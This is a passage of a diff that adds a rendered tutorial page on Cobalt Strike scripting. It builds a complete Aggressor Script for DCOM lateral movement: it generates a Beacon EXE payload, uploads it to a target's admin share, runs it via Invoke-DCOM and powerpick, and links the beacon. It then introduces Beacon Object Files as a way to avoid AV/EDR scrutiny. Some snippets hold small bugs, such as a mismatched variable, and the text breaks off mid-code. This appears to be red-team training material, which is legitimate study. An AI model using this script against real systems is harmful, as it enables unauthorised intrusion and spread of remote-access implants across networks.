+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="p">}</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="n">beacon_remote_exploit_register</span><span class="p">(</span><span class="s">&quot;dcom&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;x64&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Use DCOM to run a Beacon payload&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">invoke_dcom</span><span class="p">);</span>
+</span></code></pre></div>
+<p><code>local</code> defines variables that are local to the current function, so they will disappear once executeed.</p>
+<blockquote>
+<p><strong>Note</strong>: Sleep language have <code>global</code>, <code>closure-specific</code> and <code>local</code> scopes for variable declaration.</p>
+</blockquote>
+<p>The next step is to acknowledge receipt of the task using <code>btask</code>.  This takes the ID of the Beacon, the text to post and an ATT&amp;CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="n">sub</span><span class="w"> </span><span class="n">invoke_dcom</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="p">{</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">    </span><span class="n">local</span><span class="p">(</span><span class="err">&#39;</span><span class="n">$handle</span><span class="w"> </span><span class="n">$script</span><span class="w"> </span><span class="n">$oneliner</span><span class="w"> </span><span class="n">$payload</span><span class="err">&#39;</span><span class="p">);</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="w">    </span><span class="cp"># acknowledge this command</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="w">    </span><span class="n">btask</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Tasked Beacon to run &quot;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">listener_describe</span><span class="p">(</span><span class="n">$3</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s">&quot; on $2 via DCOM&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;T1021&quot;</span><span class="p">);</span>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>In that case:</p>
+<ul>
+<li><code>$1</code> is the Beacon ID.</li>
+<li><code>$2</code> is the target to jump.</li>
+<li><code>$3</code> is the selected listener.</li>
+</ul>
+<p>Next we want to read in the <code>Invoke-DCOM.ps1</code> script from our machine. This can be done with <code>openf</code>, <code>getFileProper</code> and <code>script_resource</code>.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="cp"># read the script</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="n">$handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">openf</span><span class="p">(</span><span class="n">getFileProper</span><span class="p">(</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Tools&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Invoke-DCOM.ps1&quot;</span><span class="p">));</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="n">$script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">readb</span><span class="p">(</span><span class="n">$handle</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">);</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="n">closef</span><span class="p">(</span><span class="n">$handle</span><span class="p">);</span>
+</span></code></pre></div>
+<p>At this moment <code>$script</code> has the content of <code>Invoke-DCOM.ps1</code>. We can use <a href="beacon_host_script">https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_host_script</a>, this will host the script inside Beacon and returns a short snippet for running it.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="cp"># host the script in Beacon</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="n">$oneliner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">beacon_host_script</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="n">$script</span><span class="p">);</span>
+</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: We can use <code>println($oneliner)</code> to see the content of variables. We can check in the Script Console <code>Cobalt Strike -&gt; Script Console</code>.</p>
+</blockquote>
+<p>Next step is to generate and upload a paylaod to the target using <a href="artifact_payload">https://download.cobaltstrike.com/aggressor-script/functions.html#artifact_payload</a> and <a href="bupload_raw">https://download.cobaltstrike.com/aggressor-script/functions.html#bupload_raw</a>. These functions will generate an EXE payload and will upload it to the target directory.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="cp"># generate stageless payload</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="n">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">artifact_payload</span><span class="p">(</span><span class="n">$3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;x64&quot;</span><span class="p">);</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="cp"># upload to the target</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="n">bupload_raw</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\\\\</span><span class="s"> $+ $2 $+ </span><span class="se">\\</span><span class="s">C$</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">beacon.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">$payload</span><span class="p">);</span>
+</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: <code>$+</code> is used for concat strings (Blank spaces are needed).</p>
+</blockquote>
+<p>Finally <a href="bpowerpick">https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick</a> can execute the <code>Invoke-DCOM</code> oneliner. We need to pass it the target computer name and the path to the uploaded payload. Also beacuse, this could be a P2P payload and we want to automatically try and link to it, which can be done with <a href="beacon_link">https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_link</a>.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="cp"># run via powerpick</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="n">bpowerpick</span><span class="o">!</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">beacon.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">$oneliner</span><span class="p">);</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="cp"># link if p2p beacon</span>
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="n">beacon_link</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="n">$2</span><span class="p">,</span><span class="w"> </span><span class="n">$3</span><span class="p">);</span>
+</span></code></pre></div>
+<p>The complete script:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">sub</span><span class="w"> </span><span class="n">invoke_dcom</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="p">{</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="w">    </span><span class="n">local</span><span class="p">(</span><span class="err">&#39;</span><span class="n">$handle</span><span class="w"> </span><span class="n">$script</span><span class="w"> </span><span class="n">$oneliner</span><span class="w"> </span><span class="n">$payload</span><span class="err">&#39;</span><span class="p">);</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="w">    </span><span class="cp"># acknowledge this command1</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="w">    </span><span class="n">btask</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Tasked Beacon to run &quot;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">listener_describe</span><span class="p">(</span><span class="n">$3</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s">&quot; on $2 via DCOM&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;T1021&quot;</span><span class="p">);</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="w">    </span><span class="cp"># read in the script</span>
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="w">    </span><span class="n">$handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">openf</span><span class="p">(</span><span class="n">getFileProper</span><span class="p">(</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Tools&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Invoke-DCOM.ps1&quot;</span><span class="p">));</span>
+</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="w">    </span><span class="n">$script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">readb</span><span class="p">(</span><span class="n">$handle</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">);</span>
+</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="w">    </span><span class="n">closef</span><span class="p">(</span><span class="n">$handle</span><span class="p">);</span>
+</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a>
+</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a><span class="w">    </span><span class="cp"># host the script in Beacon</span>
+</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="w">    </span><span class="n">$oneliner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">beacon_host_script</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="n">$script</span><span class="p">);</span>
+</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a>
+</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a><span class="w">    </span><span class="cp"># generate stageless payload</span>
+</span><span id="__span-43-17"><a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a><span class="w">    </span><span class="n">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">artifact_payload</span><span class="p">(</span><span class="n">$3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;x64&quot;</span><span class="p">);</span>
+</span><span id="__span-43-18"><a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a>
+</span><span id="__span-43-19"><a id="__codelineno-43-19" name="__codelineno-43-19" href="#__codelineno-43-19"></a><span class="w">    </span><span class="cp"># upload to the target</span>
+</span><span id="__span-43-20"><a id="__codelineno-43-20" name="__codelineno-43-20" href="#__codelineno-43-20"></a><span class="w">    </span><span class="n">bupload_raw</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\\\\</span><span class="s"> $+ $2 $+ </span><span class="se">\\</span><span class="s">C$</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">beacon.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">$payload</span><span class="p">);</span>
+</span><span id="__span-43-21"><a id="__codelineno-43-21" name="__codelineno-43-21" href="#__codelineno-43-21"></a>
+</span><span id="__span-43-22"><a id="__codelineno-43-22" name="__codelineno-43-22" href="#__codelineno-43-22"></a><span class="w">    </span><span class="cp"># run via powerpick</span>
+</span><span id="__span-43-23"><a id="__codelineno-43-23" name="__codelineno-43-23" href="#__codelineno-43-23"></a><span class="w">    </span><span class="n">bpowerpick</span><span class="o">!</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">beacon.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">$oneliner</span><span class="p">);</span>
+</span><span id="__span-43-24"><a id="__codelineno-43-24" name="__codelineno-43-24" href="#__codelineno-43-24"></a>
+</span><span id="__span-43-25"><a id="__codelineno-43-25" name="__codelineno-43-25" href="#__codelineno-43-25"></a><span class="w">    </span><span class="cp"># link if p2p beacon</span>
+</span><span id="__span-43-26"><a id="__codelineno-43-26" name="__codelineno-43-26" href="#__codelineno-43-26"></a><span class="w">    </span><span class="n">beacon_link</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="n">$2</span><span class="p">,</span><span class="w"> </span><span class="n">$3</span><span class="p">);</span>
+</span><span id="__span-43-27"><a id="__codelineno-43-27" name="__codelineno-43-27" href="#__codelineno-43-27"></a><span class="p">}</span>
+</span><span id="__span-43-28"><a id="__codelineno-43-28" name="__codelineno-43-28" href="#__codelineno-43-28"></a>
+</span><span id="__span-43-29"><a id="__codelineno-43-29" name="__codelineno-43-29" href="#__codelineno-43-29"></a><span class="n">beacon_remote_exploit_register</span><span class="p">(</span><span class="s">&quot;dcom&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;x64&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Use DCOM to run a Beacon payload&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">invoke_dcom</span><span class="p">);</span>
+</span></code></pre></div>
+<h1 id="beacon-object-files">Beacon Object Files<a class="headerlink" href="#beacon-object-files" title="Permanent link">&para;</a></h1>
+<p>Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process. The main advantage is to avoid the <code>fork &amp; run</code> pattern that commands such as <code>powershell</code>, <code>powerpick</code> and <code>execute-assembly</code> rely on. Since these spawn a sacrificial process and use process injection to run the post-ex action, they are heavily scrutinised by AV and EDR products.</p>
+<p>BOFs are COFF objects writtent in C or C++ on which beacons acts as a linker and loader. Beacon does not link BOFs to a standard C library, so many common functions are not available. However, beacon does expose several internal APIs that can be used to simplify some actions such as argument parsing and hangling output.</p>
+<p>We can download the <code>beacon.h</code> library on the follwing link.</p>
+<ul>
+<li><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h</a></li>
+</ul>
+<h2 id="example-on-inline-execute">Example on inline-execute<a class="headerlink" href="#example-on-inline-execute" title="Permanent link">&para;</a></h2>
+<p>An example of a basic BOF which sends <code>Hello World!! :)</code> as output is:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;beacon.h&quot;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="kt">void</span><span class="w"> </span><span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">)</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="p">{</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="w">    </span><span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_OUTPUT</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Hello World!! :)&quot;</span><span class="p">);</span>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>We need to compile it in windows or linux:</p>
+<ul>
+<li>Windows:</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>cl.exe /c /GS- hello-world.c /hello-world.o
+</span></code></pre></div>
+<ul>
+<li>Linux:</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>x86_64-w64-mingw32-gcc -c hello-world.c -o hello-world.o
+</span></code></pre></div>
+<p>Finally we can execute it with the command <code>inline-execute</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>beacon&gt; inline-execute C:\Windows\Temp\hello-world.o
+</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: The built-in <code>inline-execute</code> commands expects that the entry point of the BOF is called <code>go</code>.</p>
+</blockquote>
+<h2 id="handling-arguments">Handling Arguments<a class="headerlink" href="#handling-arguments" title="Permanent link">&para;</a></h2>
+<p>Sometimes we need to pass arguments to a BOF. A typicall console application may looks like <code>main(int argc, char *argv[])</code> but BOF uses <code>go(char * args, int len)</code>.</p>
+<p>These arguments are packed into a special binary format using the <code>bof_pack</code> aggressor function and can be unpacked using Beacons APIs exported via <code>beacon.h</code>.</p>
+<p>First we need to call <code>BeaconDataParse</code> to nitialise the parser and then <code>BeaconDataExtract</code> to extract the argument.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">)</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="p">{</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="w">    </span><span class="n">datap</span><span class="w"> </span><span class="n">parser</span><span class="p">;</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="w">    </span><span class="n">BeaconDataParse</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">var1</span><span class="p">;</span>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="w">    </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BeaconDataExtract</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>
+</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="w">    </span><span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_OUTPUT</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;The VARIABLE 1 is: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">var1</span><span class="p">);</span>
+</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>If we need to pass more than one argument, we need to unpack them in the same order they were packed.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">var1</span><span class="p">;</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">var2</span><span class="p">;</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BeaconDataExtract</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BeaconDataExtract</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span></code></pre></div>
+<p>We may also want to extract integers, we can do it with <code>BeaconDataInt</code>.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="kt">int</span><span class="w"> </span><span class="n">number</span><span class="p">;</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="n">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BeaconDataInt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">);</span>
+</span></code></pre></div>
+<h2 id="calling-win32-apis">Calling Win32 APIs<a class="headerlink" href="#calling-win32-apis" title="Permanent link">&para;</a></h2>
+<p>APIs such as LoadLibrary and GetProcAddress are available from a BOF, which can be used to resolve and call other APIs at runtime. </p>
+<p>BOFs provice a convention called Dynamic Function Resolution (DFR) which allows beacons to perform the necessary resolution for you.</p>
+<p>Example of definition of a DFR (MessageBoxW):</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">DECLSPEC_IMPORT</span><span class="w"> </span><span class="n">INT</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">USER32$MessageBoxW</span><span class="p">(</span><span class="n">HWND</span><span class="p">,</span><span class="w"> </span><span class="n">LPCWSTR</span><span class="p">,</span><span class="w"> </span><span class="n">LPCWSTR</span><span class="p">,</span><span class="w"> </span><span class="n">UINT</span><span class="p">);</span>
+</span></code></pre></div>
+<p>We can find the information on the documentation:</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw">https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw</a></li>
+</ul>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;beacon.h&quot;</span>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="kt">void</span><span class="w"> </span><span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">)</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="p">{</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="w">    </span><span class="n">DECLSPEC_IMPORT</span><span class="w"> </span><span class="n">INT</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">USER32$MessageBoxW</span><span class="p">(</span><span class="n">HWND</span><span class="p">,</span><span class="w"> </span><span class="n">LPCWSTR</span><span class="p">,</span><span class="w"> </span><span class="n">LPCWSTR</span><span class="p">,</span><span class="w"> </span><span class="n">UINT</span><span class="p">);</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="w">    </span><span class="n">datap</span><span class="w"> </span><span class="n">parser</span><span class="p">;</span>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="w">    </span><span class="n">BeaconDataParse</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="w">    </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">message</span><span class="p">;</span>
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="w">    </span><span class="n">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">BeaconDataExtract</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>
